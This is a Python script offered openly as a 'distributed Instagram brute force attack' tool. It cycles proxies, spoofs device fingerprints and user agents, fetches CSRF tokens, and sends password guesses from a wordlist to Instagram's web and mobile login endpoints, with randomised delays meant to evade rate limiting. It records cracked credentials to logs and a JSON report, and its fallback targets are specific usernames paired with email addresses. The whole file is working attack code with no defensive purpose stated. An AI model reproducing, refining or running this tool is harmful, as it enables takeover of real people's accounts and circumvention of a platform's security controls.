#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🚀 DISTRIBUTED INSTAGRAM BRUTE FORCE ATTACK 2025 🚀
Advanced distributed attack system with memory optimization and stealth
Designed by chin4d0ll 💕✨

Features:
- Distributed proxy-based attacks
- Memory-optimized wave system  
- Advanced Instagram API targeting
- Smart rate limiting bypass
- Real-time statistics and monitoring
"""

import asyncio
import aiohttp
import random
import time
import json
import gc
import weakref
from itertools import cycle
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple
import logging
import os
from datetime import datetime
import base64
import hashlib

# 🎀 Memory optimization imports
import sys
import psutil

@dataclass
class ProxyConfig:
    """💾 Memory-optimized proxy configuration"""
    ip: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None
    
    def __str__(self) -> str:
        auth = f"{self.username}:{self.password}@" if self.username else ""
        return f"http://{auth}{self.ip}:{self.port}"
    
    @property
    def proxy_dict(self) -> Dict[str, str]:
        proxy_url = str(self)
        return {"http": proxy_url, "https": proxy_url}

@dataclass
class TargetConfig:
    """🎯 Target configuration from brute_targets.json"""
    username: str
    email: str
    
    @classmethod
    def from_dict(cls, data: Dict) -> 'TargetConfig':
        return cls(username=data['username'], email=data['email'])

class DistributedInstagramAttacker:
    """
    💖 Advanced distributed Instagram brute force system
    Optimized for speed, stealth, and memory efficiency
    """
    
    def __init__(self, 
                 targets: List[TargetConfig],
                 proxies: List[ProxyConfig],
                 password_list: List[str],
                 max_concurrent: int = 30,
                 delay_range: Tuple[float, float] = (2.0, 5.0),
                 waves: int = 20):
        
        self.targets = targets
        self.proxy_cycle = cycle(proxies) if proxies else None
        self.password_list = password_list
        self.max_concurrent = max_concurrent
        self.delay_range = delay_range
        self.waves = waves
        
        # 📊 Statistics tracking
        self.stats = {
            'total_attempts': 0,
            'success_count': 0,
            'failed_count': 0,
            'rate_limited_count': 0,
            'checkpoint_count': 0,
            'start_time': None,
            'found_passwords': {}
        }
        
        # 🛡️ Session management with auto-cleanup
        self.sessions = weakref.WeakSet()
        
        # 🎭 Advanced user agents for Instagram
        self.mobile_agents = [
            'Instagram 274.0.0.18.75 Android (29/10; 420dpi; 1080x2280; Xiaomi; Mi 9T; davinci; qcom; ru_RU; 436384447)',
            'Instagram 274.0.0.18.75 Android (28/9; 320dpi; 720x1520; samsung; SM-A750F; a7y18lte; exynos7885; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (30/11; 560dpi; 1440x3040; samsung; SM-G973F; beyond1; exynos9820; en_US; 436384447)',
            'Instagram 274.0.0.18.75 Android (29/10; 480dpi; 1080x2340; OnePlus; GM1903; OnePlus7; qcom; en_US; 436384447)',
        ]
        
        self.web_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
        ]
        
        # 🎯 Instagram endpoints
        self.endpoints = {
            'web_login': 'https://www.instagram.com/accounts/login/ajax/',
            'mobile_login': 'https://i.instagram.com/api/v1/accounts/login/',
            'csrf_token': 'https://www.instagram.com/accounts/login/',
            'mobile_csrf': 'https://i.instagram.com/api/v1/si/fetch_headers/'
        }
        
        # 🔒 Setup logging
        self.setup_logging()
    
    def setup_logging(self):
        """📝 Setup advanced logging system"""
        os.makedirs('logs/distributed', exist_ok=True)
        
        # Create detailed logger
        self.logger = logging.getLogger('DistributedAttacker')
        self.logger.setLevel(logging.INFO)
        
        # File handler with rotation
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        log_file = f'logs/distributed/attack_{timestamp}.log'
        
        handler = logging.FileHandler(log_file)
        formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        )
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        print(f"📝 Logging to: {log_file}")
    
    def generate_device_fingerprint(self) -> Dict[str, str]:
        """🎭 Generate realistic device fingerprint"""
        return {
            'android_id': 'android-' + ''.join(random.choices('0123456789abcdef', k=16)),
            'device_id': str(random.randint(10**20, 10**21 - 1)),
            'family_device_id': str(random.randint(10**20, 10**21 - 1)),
            'mid': base64.b64encode(os.urandom(16)).decode().replace('=', '').replace('+', '-').replace('/', '_'),
            'session_id': hashlib.md5(str(random.random()).encode()).hexdigest()
        }
    
    async def create_optimized_session(self, proxy: Optional[ProxyConfig] = None) -> aiohttp.ClientSession:
        """
        🏭 Create highly optimized session for Instagram attacks
        """
        fingerprint = self.generate_device_fingerprint()
        
        # 🎯 Advanced headers for Instagram
        headers = {
            'User-Agent': random.choice(self.mobile_agents + self.web_agents),
            'Accept': '*/*',
            'Accept-Language': random.choice(['en-US', 'en-GB', 'es-ES', 'fr-FR']),
            'Accept-Encoding': 'gzip, deflate, br',
            'X-IG-App-ID': '124024574287414',
            'X-IG-Android-ID': fingerprint['android_id'],
            'X-IG-Device-ID': fingerprint['device_id'],
            'X-IG-Family-Device-ID': fingerprint['family_device_id'],
            'X-Mid': fingerprint['mid'],
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }
        
        # ⚡ Ultra-fast connector settings
        connector = aiohttp.TCPConnector(
            limit=200,                    # Increased connection pool
            limit_per_host=20,           # Per-host limit
            ttl_dns_cache=600,           # Longer DNS cache
            use_dns_cache=True,
            keepalive_timeout=60,        # Longer keepalive
            enable_cleanup_closed=True,
            ssl=False                    # Disable SSL verification for speed
        )
        
        # 🕒 Optimized timeouts
        timeout = aiohttp.ClientTimeout(
            total=25,        # Total timeout
            connect=8,       # Connection timeout
            sock_read=15     # Socket read timeout
        )
        
        # 🎯 Create session with proxy if available
        session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers,
            trust_env=True
        )
        
        # 📝 Track session for cleanup
        self.sessions.add(session)
        return session
    
    async def get_csrf_token(self, session: aiohttp.ClientSession, 
                           proxy: Optional[ProxyConfig] = None,
                           mode: str = 'web') -> Optional[str]:
        """🔑 Advanced CSRF token extraction with multiple methods"""
        
        try:
            endpoint = self.endpoints['csrf_token'] if mode == 'web' else self.endpoints['mobile_csrf']
            proxy_dict = proxy.proxy_dict if proxy else None
            
            async with session.get(endpoint, proxy=proxy_dict) as response:
                if response.status == 200:
                    text = await response.text()
                    
                    # Multiple extraction methods
                    extraction_methods = [
                        lambda t: t.split('"csrf_token":"')[1].split('"')[0] if '"csrf_token":"' in t else None,
                        lambda t: t.split('csrftoken=')[1].split(';')[0] if 'csrftoken=' in t else None,
                        lambda t: response.cookies.get('csrftoken').value if response.cookies.get('csrftoken') else None
                    ]
                    
                    for method in extraction_methods:
                        try:
                            token = method(text)
                            if token:
                                return token
                        except:
                            continue
                            
        except Exception as e:
            self.logger.warning(f"CSRF token extraction failed: {e}")
        
        return None
    
    async def attempt_login(self, session: aiohttp.ClientSession,
                          target: TargetConfig, 
                          password: str,
                          proxy: Optional[ProxyConfig] = None,
                          mode: str = 'hybrid') -> Dict[str, any]:
        """
        🎯 Advanced Instagram login attempt with multiple attack vectors
        """
        
        # 🎲 Random attack mode selection
        if mode == 'hybrid':
            attack_mode = random.choice(['web', 'mobile_api'])
        else:
            attack_mode = mode
        
        try:
            # 🔑 Get CSRF token
            csrf_token = await self.get_csrf_token(session, proxy, attack_mode)
            if not csrf_token:
                return {'success': False, 'reason': 'no_csrf_token', 'status': 0}
            
            # 🎭 Update session headers with CSRF
            session.headers.update({'X-CSRFToken': csrf_token})
            
            # 🎯 Prepare login data based on attack mode
            if attack_mode == 'mobile_api':
                return await self.mobile_api_login(session, target, password, csrf_token, proxy)
            else:
                return await self.web_login(session, target, password, csrf_token, proxy)
                
        except asyncio.TimeoutError:
            return {'success': False, 'reason': 'timeout', 'status': 0}
        except Exception as e:
            self.logger.error(f"Login attempt error: {e}")
            return {'success': False, 'reason': 'error', 'status': 0, 'error': str(e)}
    
    async def mobile_api_login(self, session: aiohttp.ClientSession,
                             target: TargetConfig,
                             password: str, 
                             csrf_token: str,
                             proxy: Optional[ProxyConfig]) -> Dict[str, any]:
        """📱 Mobile API login attack"""
        
        fingerprint = self.generate_device_fingerprint()
        
        login_data = {
            'username': target.username,
            'password': password,
            'device_id': fingerprint['android_id'],
            'login_attempt_account_recovery_allowed': 'true',
            '_uuid': fingerprint['device_id'],
            'phone_id': fingerprint['family_device_id'],
            '_csrftoken': csrf_token,
            'login_attempt_count': str(random.randint(0, 2))
        }
        
        # 🔐 Sign the body (simplified Instagram signing)
        signed_body = self.generate_signed_body(login_data)
        proxy_dict = proxy.proxy_dict if proxy else None
        
        async with session.post(
            self.endpoints['mobile_login'],
            data=signed_body,
            proxy=proxy_dict
        ) as response:
            
            return await self.analyze_response(response, target.username, password, 'mobile_api')
    
    async def web_login(self, session: aiohttp.ClientSession,
                       target: TargetConfig,
                       password: str,
                       csrf_token: str, 
                       proxy: Optional[ProxyConfig]) -> Dict[str, any]:
        """🌐 Web login attack"""
        
        # 🎯 Additional web headers
        session.headers.update({
            'X-Instagram-AJAX': '1',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded'
        })
        
        login_data = {
            'username': target.username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}'
        }
        
        proxy_dict = proxy.proxy_dict if proxy else None
        
        async with session.post(
            self.endpoints['web_login'],
            data=login_data,
            proxy=proxy_dict
        ) as response:
            
            return await self.analyze_response(response, target.username, password, 'web')
    
    def generate_signed_body(self, data: Dict) -> str:
        """🔐 Generate signed body for mobile API"""
        json_data = json.dumps(data)
        from urllib.parse import quote
        return f'signed_body={quote(json_data)}&ig_sig_key_version=4'
    
    async def analyze_response(self, response: aiohttp.ClientResponse,
                             username: str, password: str, method: str) -> Dict[str, any]:
        """🔍 Advanced response analysis with pattern detection"""
        
        status_code = response.status
        text = await response.text()
        text_lower = text.lower()
        
        # 🎯 Success patterns
        success_patterns = [
            'authenticated', '"status":"ok"', 'logged_in_user', 
            'sessionid', '"user":', 'navigation'
        ]
        
        # ⏳ Rate limit patterns
        rate_limit_patterns = [
            'rate_limited', 'please wait', 'too many requests',
            'spam', 'try again later', 'temporarily blocked'
        ]
        
        # 🔒 Checkpoint patterns
        checkpoint_patterns = [
            'checkpoint_required', 'challenge_required', 
            'two_factor_required', 'verification', 'confirm'
        ]
        
        # 🎉 Check for success
        if any(pattern in text_lower for pattern in success_patterns):
            result = {
                'success': True, 
                'reason': 'login_success',
                'status': status_code,
                'method': method,
                'cookies': dict(response.cookies)
            }
            self.stats['found_passwords'][username] = password
            self.logger.info(f"SUCCESS: {username}:{password} via {method}")
            return result
        
        # ⏳ Check for rate limiting
        if status_code == 429 or any(pattern in text_lower for pattern in rate_limit_patterns):
            self.stats['rate_limited_count'] += 1
            return {'success': False, 'reason': 'rate_limited', 'status': status_code}
        
        # 🔒 Check for checkpoint
        if any(pattern in text_lower for pattern in checkpoint_patterns):
            self.stats['checkpoint_count'] += 1
            self.logger.info(f"CHECKPOINT: {username}:{password}")
            return {'success': False, 'reason': 'checkpoint', 'status': status_code}
        
        # ❌ Regular failure
        return {'success': False, 'reason': 'invalid_credentials', 'status': status_code}
    
    async def single_distributed_attack(self, target: TargetConfig, 
                                       password: str,
                                       proxy: Optional[ProxyConfig] = None) -> Dict[str, any]:
        """
        🎯 Single distributed attack attempt with full optimization
        """
        
        # 🎲 Random delay for stealth
        delay = random.uniform(*self.delay_range)
        await asyncio.sleep(delay)
        
        session = await self.create_optimized_session(proxy)
        
        try:
            result = await self.attempt_login(session, target, password, proxy)
            self.stats['total_attempts'] += 1
            
            if result['success']:
                self.stats['success_count'] += 1
                print(f"🎉 SUCCESS: {target.username}:{password} via {proxy.ip if proxy else 'direct'}")
            else:
                self.stats['failed_count'] += 1
                reason = result.get('reason', 'unknown')
                if reason == 'rate_limited':
                    print(f"⏳ Rate limited: {target.username} via {proxy.ip if proxy else 'direct'}")
                else:
                    print(f"❌ Failed: {target.username}:{password} ({reason})")
            
            return result
            
        finally:
            # 🧹 Immediate cleanup
            await session.close()
    
    async def attack_wave(self, wave_num: int, wave_targets: List[Tuple[TargetConfig, str]]) -> List[Dict]:
        """
        🌊 Execute a wave of distributed attacks
        Memory-optimized with immediate cleanup
        """
        
        print(f"\n🌊 Wave {wave_num + 1} - {len(wave_targets)} attacks")
        
        # 📊 Memory monitoring
        process = psutil.Process()
        memory_before = process.memory_info().rss / 1024 / 1024  # MB
        
        tasks = []
        
        # 🚀 Create tasks for this wave
        for target, password in wave_targets:
            proxy = next(self.proxy_cycle) if self.proxy_cycle else None
            
            task = asyncio.create_task(
                self.single_distributed_attack(target, password, proxy)
            )
            tasks.append(task)
        
        # ⚡ Execute all tasks concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # 🧹 Force garbage collection
        gc.collect()
        
        # 📊 Memory monitoring after cleanup
        memory_after = process.memory_info().rss / 1024 / 1024  # MB
        memory_diff = memory_after - memory_before
        
        print(f"💾 Memory: {memory_after:.1f}MB ({memory_diff:+.1f}MB)")
        
        return [r for r in results if not isinstance(r, Exception)]
    
    async def distributed_brute_force(self) -> Dict[str, any]:
        """
        🚀 Main distributed brute force attack function
        Highly optimized for speed and memory efficiency
        """
        
        self.stats['start_time'] = time.time()
        
        print("🚀 DISTRIBUTED INSTAGRAM BRUTE FORCE ATTACK 2025")
        print("=" * 60)
        print(f"🎯 Targets: {len(self.targets)}")
        print(f"🔑 Passwords: {len(self.password_list):,}")
        print(f"🌐 Proxies: {len(list(self.proxy_cycle)) if self.proxy_cycle else 0}")
        print(f"🌊 Waves: {self.waves}")
        print(f"⚡ Max Concurrent: {self.max_concurrent}")
        print(f"⏱️ Delay Range: {self.delay_range[0]}-{self.delay_range[1]}s")
        print("=" * 60)
        
        # 🎯 Generate all attack combinations
        all_combinations = []
        for target in self.targets:
            for password in self.password_list:
                all_combinations.append((target, password))
        
        random.shuffle(all_combinations)  # 🎲 Randomize attack order
        
        total_attacks = len(all_combinations)
        attacks_per_wave = max(1, total_attacks // self.waves)
        
        print(f"📊 Total attack combinations: {total_attacks:,}")
        print(f"🌊 Attacks per wave: {attacks_per_wave:,}")
        
        # 🌊 Execute waves
        for wave_num in range(self.waves):
            start_idx = wave_num * attacks_per_wave
            
            if wave_num == self.waves - 1:  # Last wave gets remaining
                wave_targets = all_combinations[start_idx:]
            else:
                end_idx = start_idx + attacks_per_wave
                wave_targets = all_combinations[start_idx:end_idx]
            
            if not wave_targets:
                break
            
            # 🚀 Execute wave
            await self.attack_wave(wave_num, wave_targets)
            
            # 📊 Progress report
            progress = ((wave_num + 1) / self.waves) * 100
            success_rate = (self.stats['success_count'] / max(1, self.stats['total_attempts'])) * 100
            elapsed = time.time() - self.stats['start_time']
            speed = self.stats['total_attempts'] / elapsed if elapsed > 0 else 0
            
            print(f"📈 Progress: {progress:.1f}% | Success: {success_rate:.2f}% | Speed: {speed:.1f} att/s")
            
            # 🛑 Early termination if passwords found
            if self.stats['found_passwords']:
                print(f"\n🎉 PASSWORDS FOUND! Stopping attack...")
                break
            
            # 😴 Cool down between waves
            if wave_num < self.waves - 1:
                cooldown = random.uniform(2, 5)
                print(f"😴 Wave cooldown: {cooldown:.1f}s")
                await asyncio.sleep(cooldown)
        
        return await self.generate_final_report()
    
    async def generate_final_report(self) -> Dict[str, any]:
        """📊 Generate comprehensive attack report"""
        
        total_time = time.time() - self.stats['start_time']
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'targets': [{'username': t.username, 'email': t.email} for t in self.targets],
            'statistics': {
                'total_attempts': self.stats['total_attempts'],
                'success_count': self.stats['success_count'],
                'failed_count': self.stats['failed_count'],
                'rate_limited_count': self.stats['rate_limited_count'],
                'checkpoint_count': self.stats['checkpoint_count'],
                'success_rate': (self.stats['success_count'] / max(1, self.stats['total_attempts'])) * 100,
                'total_time_seconds': total_time,
                'attacks_per_second': self.stats['total_attempts'] / total_time if total_time > 0 else 0
            },
            'found_passwords': self.stats['found_passwords'],
            'configuration': {
                'max_concurrent': self.max_concurrent,
                'delay_range': self.delay_range,
                'waves': self.waves,
                'password_count': len(self.password_list)
            }
        }
        
        # 💾 Save report
        os.makedirs('results/distributed', exist_ok=True)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f'results/distributed/attack_report_{timestamp}.json'
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.logger.info(f"Report saved: {report_file}")
        
        # 🎉 Print final summary
        print("\n" + "=" * 60)
        print("📊 DISTRIBUTED ATTACK SUMMARY")
        print("=" * 60)
        print(f"⏱️ Total Time: {total_time/60:.2f} minutes")
        print(f"🎯 Total Attempts: {self.stats['total_attempts']:,}")
        print(f"✅ Successful: {self.stats['success_count']}")
        print(f"❌ Failed: {self.stats['failed_count']}")
        print(f"⏳ Rate Limited: {self.stats['rate_limited_count']}")
        print(f"🔒 Checkpoints: {self.stats['checkpoint_count']}")
        print(f"📈 Success Rate: {report['statistics']['success_rate']:.2f}%")
        print(f"🚀 Attack Speed: {report['statistics']['attacks_per_second']:.2f} att/s")
        
        if self.stats['found_passwords']:
            print(f"\n🎉 PASSWORDS FOUND:")
            for username, password in self.stats['found_passwords'].items():
                print(f"   🔑 {username} : {password}")
        else:
            print(f"\n💔 No passwords found")
        
        print(f"\n📁 Full report: {report_file}")
        print("=" * 60)
        
        return report

# 🛠️ Utility Functions

def load_targets_from_file(filename: str = 'brute_targets.json') -> List[TargetConfig]:
    """📁 Load targets from brute_targets.json"""
    try:
        with open(filename, 'r') as f:
            data = json.load(f)
        
        targets = [TargetConfig.from_dict(item) for item in data]
        print(f"📁 Loaded {len(targets)} targets from {filename}")
        return targets
        
    except FileNotFoundError:
        print(f"❌ File {filename} not found!")
        return []
    except Exception as e:
        print(f"❌ Error loading targets: {e}")
        return []

def load_proxies_from_file(filename: str = 'proxy_list.txt') -> List[ProxyConfig]:
    """📁 Load proxies from file"""
    proxies = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split(':')
                if len(parts) >= 2:
                    ip, port = parts[0], int(parts[1])
                    username = parts[2] if len(parts) > 2 else None
                    password = parts[3] if len(parts) > 3 else None
                    
                    proxies.append(ProxyConfig(ip, port, username, password))
        
        print(f"📁 Loaded {len(proxies)} proxies from {filename}")
        return proxies
        
    except FileNotFoundError:
        print(f"⚠️ Proxy file {filename} not found, running without proxies")
        return []

def load_passwords_from_file(filename: str = 'passwords.txt') -> List[str]:
    """📁 Load password list"""
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        print(f"📁 Loaded {len(passwords)} passwords from {filename}")
        return passwords
        
    except FileNotFoundError:
        print(f"❌ Password file {filename} not found!")
        return []

# 🚀 Main execution
async def main():
    """🎯 Main distributed attack execution"""
    
    print("💕✨ DISTRIBUTED INSTAGRAM ATTACK SYSTEM 2025 ✨💕")
    print("🎀 Designed for speed, stealth, and efficiency 🎀")
    print()
    
    # 📋 Load configuration
    targets = load_targets_from_file('brute_targets.json')
    if not targets:
        print("❌ No targets loaded. Creating example targets...")
        targets = [
            TargetConfig("alx.trading", "alxtrading@mail.com"),
            TargetConfig("whatilove1728", "whatilove@gmail.com")
        ]
    
    proxies = load_proxies_from_file('proxy_list.txt')
    passwords = load_passwords_from_file('passwords.txt')
    
    if not passwords:
        print("❌ No passwords loaded. Exiting...")
        return
    
    # 🎛️ Attack configuration
    print("⚙️ ATTACK CONFIGURATION:")
    max_concurrent = int(input("🧵 Max concurrent attacks (default=30): ") or "30")
    waves = int(input("🌊 Number of waves (default=20): ") or "20") 
    min_delay = float(input("⏱️ Min delay between attacks (default=2.0): ") or "2.0")
    max_delay = float(input("⏱️ Max delay between attacks (default=5.0): ") or "5.0")
    
    use_proxies = input("🌐 Use proxies? (Y/n): ").strip().lower() != 'n'
    if not use_proxies:
        proxies = []
    
    print(f"\n🚀 CONFIGURATION SUMMARY:")
    print(f"   🎯 Targets: {len(targets)}")
    print(f"   🔑 Passwords: {len(passwords):,}")
    print(f"   🌐 Proxies: {len(proxies)}")
    print(f"   🧵 Concurrent: {max_concurrent}")
    print(f"   🌊 Waves: {waves}")
    print(f"   ⏱️ Delay: {min_delay}-{max_delay}s")
    
    confirm = input(f"\n⚠️ Start distributed attack? (y/N): ")
    if confirm.lower() != 'y':
        print("👋 Attack cancelled")
        return
    
    # 🚀 Create and execute attacker
    attacker = DistributedInstagramAttacker(
        targets=targets,
        proxies=proxies,
        password_list=passwords,
        max_concurrent=max_concurrent,
        delay_range=(min_delay, max_delay),
        waves=waves
    )
    
    try:
        # 🎯 Execute distributed attack
        await attacker.distributed_brute_force()
        
    except KeyboardInterrupt:
        print(f"\n⚠️ Attack interrupted by user")
        await attacker.generate_final_report()
    except Exception as e:
        print(f"💥 Critical error: {e}")
        await attacker.generate_final_report()

if __name__ == "__main__":
    # 🎀 Execute the distributed attack
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"💥 Fatal error: {e}")
